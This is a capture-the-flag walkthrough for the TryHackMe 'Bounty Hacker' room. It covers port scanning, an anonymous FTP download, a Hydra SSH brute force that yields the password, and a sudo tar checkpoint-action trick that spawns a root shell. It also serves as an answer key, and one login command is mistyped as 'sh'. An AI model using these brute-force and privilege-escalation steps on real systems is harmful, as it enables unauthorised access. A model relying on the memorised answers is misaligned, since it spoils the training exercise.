# [Bounty Hacker](https://tryhackme.com/room/cowboyhacker)

## You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!

# Living up to the title.

## You were boasting on and on about your elite hacker skills in the bar and a few Bounty Hunters decided they'd take you up on claims! Prove your status is more than just a few glasses at the bar. I sense bell peppers & beef in your future!

### Find open ports on the machine

1. Perform a port scan on the target machine to identify open ports and services running

```bash
nmap <TARGET_IP>
```

[SCREEN01]

---

### Who wrote the task list?

_Have you visited FTP?_

1. Connect to the FTP service using anonymous login credentials.

2. List available files and download all files from the FTP server.

3. Examine the contents of `task.txt` to find the author's name.

```bash
ftp <TARGET_IP>
anonymous
ls
prompt off
mget *
exit
cat task.txt
```

[SCREEN02]

[SCREEN03]

**Answer:** The name is in `task.txt` file. It is `lin`

---

### What service can you bruteforce with the text file found?

_What is on port 22?_

1. Review the nmap scan results from the first question.

[SCREEN01]

**Answer:** Service on port 22 is `SSH`

---

### What is the users password?

_Hydra may be able to help._

1. Use Hydra to perform a brute-force attack on the SSH service.

2. Use the username `lin` (found in task.txt) and the password list from `locks.txt`.

```bash
hydra -l lin -P locks.txt ssh://<TARGET_IP>
```

**Flags explanation:**

- `-l lin`: Specify the username
- `-P locks.txt`: Use the password list file
- `ssh://<TARGET_IP>`: Target the SSH service

[SCREEN04]

**Answer:** The password is `RedDr4gonSynd1cat3`

---

### user.txt

1. SSH into the target machine using the credentials obtained (`lin:RedDr4gonSynd1cat3`).

2. List files in the home directory.

3. Read the contents of `user.txt` to obtain the user flag.

```bash
sh lin@<TARGET_IP>
# Enter password: RedDr4gonSynd1cat3
ls
cat user.txt
```

[SCREEN05]

---

### root.txt

1. Check what commands the current user can run with sudo privileges.

```bash
sudo -l
```

[SCREEN06]

**Output:** User lin may run `/bin/tar` as root without a password.

2. Search [GTFOBins](https://gtfobins.github.io/) for the `tar` binary to find privilege escalation methods.

3. Use the sudo exploit for tar to spawn a root shell.

4. Verify you have root access and read the root flag.

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
whoami
# Output: root
cat /root/root.txt
```

**Exploit explanation:**

- `sudo tar`: Run tar with root privileges
- `-cf /dev/null /dev/null`: Create an archive (dummy operation)
- `--checkpoint=1`: Set checkpoint interval
- `--checkpoint-action=exec=/bin/sh`: Execute a shell at the checkpoint, spawning a root shell

[SCREEN07]
